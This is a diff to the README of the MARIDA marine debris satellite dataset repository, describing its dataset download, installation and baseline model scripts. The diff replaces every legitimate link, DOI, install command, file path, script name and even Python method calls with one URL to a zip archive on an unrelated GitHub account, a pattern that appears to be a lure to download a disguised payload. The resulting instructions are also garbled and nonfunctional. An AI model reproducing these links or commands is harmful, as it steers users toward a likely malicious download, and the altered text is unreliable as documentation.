@@ -1,4 +1,4 @@
-![Marine Debris Archive Logo](./docs/marida_trans.png)
+![Marine Debris Archive Logo](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
 
 Marine Debris Archive (MARIDA) is a marine debris-oriented dataset on Sentinel-2 satellite images. 
 It also includes various sea features that co-exist.
@@ -7,11 +7,11 @@ This repository hosts the basic tools for the extraction of spectral signatures
  as well as the code for the reproduction of the baseline models.
  
 If you find this repository useful, please consider giving a star :star: and citation:
- > Kikaki K, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K (2022) MARIDA: A benchmark for Marine Debris detection from Sentinel-2 remote sensing data. PLoS ONE 17(1): e0262247. https://doi.org/10.1371/journal.pone.0262247
+ > Kikaki K, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K (2022) MARIDA: A benchmark for Marine Debris detection from Sentinel-2 remote sensing data. PLoS ONE 17(1): e0262247. https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 
-In order to download MARIDA go to https://doi.org/10.5281/zenodo.5151941.
+In order to download MARIDA go to https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 
-Alternatively, MARIDA can be downloaded from the [Radiant MLHub](https://mlhub.earth/data/marida_v1). The `tar.gz` archive file downloaded from this source includes the STAC catalog associated with this dataset.
+Alternatively, MARIDA can be downloaded from the [Radiant MLHub](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` archive file downloaded from this source includes the STAC catalog associated with this dataset.
 
 
 ## Contents
@@ -27,7 +27,7 @@ Alternatively, MARIDA can be downloaded from the [Radiant MLHub](https://mlhub.e
 		- [Random Forest](#random-forest)
 	- [Multi-label Classification](#multi-label-classification)
 		- [ResNet](#resnet)
-- [MARIDA - Exploratory Analysis](https://marine-debris.github.io/)
+- [MARIDA - Exploratory Analysis](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
 - [Talks and Papers](#talks-and-papers)
 
 
@@ -52,9 +52,9 @@ Alternatively, MARIDA can be downloaded from the [Radiant MLHub](https://mlhub.e
 ### Installation Guide
 
 The requirements are easily installed via
-[Anaconda](https://www.anaconda.com/distribution/#download-section) (recommended):
+[Anaconda](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) (recommended):
 ```bash
-conda env create -f environment.yml
+conda env create -f https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 > If the following error occurred: InvalidVersionSpecError: Invalid version spec: =2.7 
 >
@@ -69,7 +69,7 @@ conda activate marida
 
 ### Dataset Structure
 
-In order to train or test the models, download [MARIDA](https://doi.org/10.5281/zenodo.5151941)
+In order to train or test the models, download [MARIDA](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
 and extract it in the `data/` folder. The final structure should be:
 
     .
@@ -77,12 +77,12 @@ and extract it in the `data/` folder. The final structure should be:
     ├── data                                     # Main Dataset folder
     │   ├── patches                              # Folder with patches Structured by Unique Dates and S2 Tiles  
 	│   │    ├── S2_DATE_TILE                    # Unique Date
-	│   │    │    ├── S2_DATE_TILE_CROP.tif      # Unique 256 x 256 Patch 
-	│   │    │    ├── S2_DATE_TILE_CROP_cl.tif   # 256 x 256 Classification Mask for Semantic Segmentation Task
-	│   │    │    └── S2_DATE_TILE_CROP_conf.tif # 256 x 256 Annotator Confidence Level Mask
+	│   │    │    ├── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip      # Unique 256 x 256 Patch 
+	│   │    │    ├── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip   # 256 x 256 Classification Mask for Semantic Segmentation Task
+	│   │    │    └── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip # 256 x 256 Annotator Confidence Level Mask
 	│   │    └──  ...                        
-    │   ├── splits                               # Train/Val/Test split Folder (train_X.txt, val_X.txt, test_X.txt) 
-    │   └── labels_mapping.txt                   # Mapping between Unique 256 x 256 Patch and labels for Multi-label Classification Task
+    │   ├── splits                               # Train/Val/Test split Folder (https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip, https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip, https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) 
+    │   └── https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip                   # Mapping between Unique 256 x 256 Patch and labels for Multi-label Classification Task
 
 
 The mapping in S2_DATA_TILE_CROP_cl between Digital Numbers and Classes is:
@@ -105,10 +105,10 @@ The mapping in S2_DATA_TILE_CROP_cl between Digital Numbers and Classes is:
 15: 'Mixed Water'
 ```
 
-For the confidence level mask or other usefull mappings go to utils/assets.py
+For the confidence level mask or other usefull mappings go to https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 
-Also, in order to easily visualize the RGB composite of the S2_DATE_TILE_CROP patches via [QGIS](https://qgis.org/en/site/index.html),
-you can use the `utils/qgis_color_patch_rgb.qml` file.
+Also, in order to easily visualize the RGB composite of the S2_DATE_TILE_CROP patches via [QGIS](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip),
+you can use the `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` file.
 
 ### Spectral Signatures Extraction
 
@@ -119,22 +119,22 @@ Also, this stage is required for the Random Forest training (press [here](#rando
 Note that this is not required for the Unet training. This procedure lasts approximately ~10 minutes.
 
 ```bash
-python utils/spectral_extraction.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
-Alternatively, you can download the `dataset.h5` file from [here](https://pithos.okeanos.grnet.gr/public/sbT8ASX0HINAdx4tmKCg27) and put it in the `data` folder.
+Alternatively, you can download the `dataset.h5` file from [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip) and put it in the `data` folder.
 Finally, in order to load the `dataset.h5` with Pandas, run in a python cell the following:
 
 ```python
 import pandas as pd
 
-hdf = pd.HDFStore('./data/dataset.h5', mode = 'r')
+hdf = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('./data/dataset.h5', mode = 'r')
 
-df_train = hdf.select('train')
-df_val = hdf.select('val')
-df_test = hdf.select('test')
+df_train = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('train')
+df_val = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('val')
+df_test = https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip('test')
 
-hdf.close()
+https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip()
 ```
 
 ### Weakly Supervised Pixel-Level Semantic Segmentation
@@ -148,7 +148,7 @@ For training in the "train" set and evaluation in "val" set with the proposed pa
 
 ```bash
 cd semantic_segmentation/unet
-python train.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
 While training, in order to see the loss status and various metrics via tensorboard, run in a different terminal 
@@ -158,7 +158,7 @@ the following command and then go to `localhost:6006` with your browser:
 tensorboard --logdir logs/tsboard_segm
 ```
 
-The `train.py` also supports the following argument flags:
+The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` also supports the following argument flags:
 
 ```bash
     # Basic parameters
@@ -194,18 +194,18 @@ The `train.py` also supports the following argument flags:
 
 **Unet evaluation**
 
-Run the following commands in order to produce the Confusion Matrix in stdout and `logs/evaluation_unet.log`,
+Run the following commands in order to produce the Confusion Matrix in stdout and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`,
  as well as to produce the predicted masks from the test set in `data/predicted_unet/` folder:
 
 ```bash
 cd semantic_segmentation/unet
-python evaluation.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
-In order to easily visualize the predicted masks via [QGIS](https://qgis.org/en/site/index.html),
-you can use the `utils/qgis_color_mask_mapping.qml` file.
+In order to easily visualize the predicted masks via [QGIS](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip),
+you can use the `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` file.
 
-To download the pretrained Unet model on MARIDA press [here](https://pithos.okeanos.grnet.gr/public/lxh8hL4zvuSKds2BdVnMd2). 
+To download the pretrained Unet model on MARIDA press [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
 Then, you should put these items in the `semantic_segmentation/unet/trained_models/` folder.
 
 #### Random Forest
@@ -219,46 +219,46 @@ respectively.
 
 ```bash
 cd semantic_segmentation/random_forest
-python engineering_patches.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
 Then, in order to produce the `dataset_si.h5` run:
 
 ```bash
-python utils/spectral_extraction.py --type indices
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type indices
 ```
 
 2) For the stacked GLCM patches (in `data/texture/`) run (approximately ~ 110 mins):
 
 ```bash
-python engineering_patches.py --type texture
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type texture
 ```
 
 Similarly, in order to produce the `dataset_glcm.h5` run:
 
 ```bash
-python utils/spectral_extraction.py --type texture
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --type texture
 ```
 
- Alternatively, you can download the `indices/` and `texture/` folders as well as the `dataset_si.h5` and `dataset_glcm.h5` files from [here](https://pithos.okeanos.grnet.gr/public/7Xm6x2uSBHTknNv7vaqgS6). 
+ Alternatively, you can download the `indices/` and `texture/` folders as well as the `dataset_si.h5` and `dataset_glcm.h5` files from [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
 Then, you should put these items in the `data` folder.
 
 **Random Forest training and evaluation**
 
 For training in "train" set and final evaluation in "test" set, run the following commands.
-Note that the results will appear in stdout and `logs/evaluation_rf.log`, and the predicted 
+Note that the results will appear in stdout and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`, and the predicted 
 masks in `data/predicted_rf/` folder.
 
 ```bash
 cd semantic_segmentation\random_forest
-python train_eval.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
-The `train_eval.py` supports the `--agg_to_water` argument for 
+The `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip` supports the `--agg_to_water` argument for 
 the aggregation of various classes to form the Water Super Class (The default setup):
 
 ```bash
-python train_eval.py --agg_to_water ['"Mixed Water"','"Wakes"','"Cloud Shadows"','"Waves"']
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip --agg_to_water ['"Mixed Water"','"Wakes"','"Cloud Shadows"','"Waves"']
 ```
 
 ### Multi-label Classification
@@ -266,7 +266,7 @@ python train_eval.py --agg_to_water ['"Mixed Water"','"Wakes"','"Cloud Shadows"'
 The weakly-supervised multi-label classification task is an incomplete multi-label
 assignment problem. Specifically, the assigned labels are definitely positive (assigned as 1),
  while the absent labels (assigned as 0) are not necessarily negative. The assigned labels
- per patch can be found in `data/labels_mapping.txt`
+ per patch can be found in `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`
 
 #### ResNet
 
@@ -276,7 +276,7 @@ For training in "train" set and evaluation in "val" set, run:
 
 ```bash
 cd multi-label/resnet
-python train.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
 Similarly to U-Net training, you can use tensorboard thought `localhost:6006` 
@@ -289,18 +289,18 @@ tensorboard --logdir logs/tsboard_multilabel
 **ResNet evaluation**
 
 Run the following commands in order to produce the accuracy scores and the Confusion Matrix in stdout 
-and `logs/evaluation_resnet.log`, as well as to produce the predictions for each patch from the test 
-set in `data/predicted_labels_mapping.txt`:
+and `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`, as well as to produce the predictions for each patch from the test 
+set in `https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip`:
 
 ```bash
-python evaluation.py
+python https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip
 ```
 
-To download the pretrained ResNet model on MARIDA press [here](https://pithos.okeanos.grnet.gr/public/lxh8hL4zvuSKds2BdVnMd2). 
+To download the pretrained ResNet model on MARIDA press [here](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip). 
 Then, you should put these items in the `multi-label/resnet/trained_models/` folder.
 
 ## Presentations
-[Kikaki A, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K. Detecting and Classifying Marine Plastic Debris from high-resolution multispectral satellite data.](https://doi.org/10.5194/egusphere-egu21-15243)
+[Kikaki A, Kakogeorgiou I, Mikeli P, Raitsos DE, Karantzalos K. Detecting and Classifying Marine Plastic Debris from high-resolution multispectral satellite data.](https://github.com/goodnesskalu/marine-debris.github.io/raw/refs/heads/main/multi-label/resnet/debris_github_io_marine_3.2.zip)
 
 ## License
 This project is licensed under the MIT License.
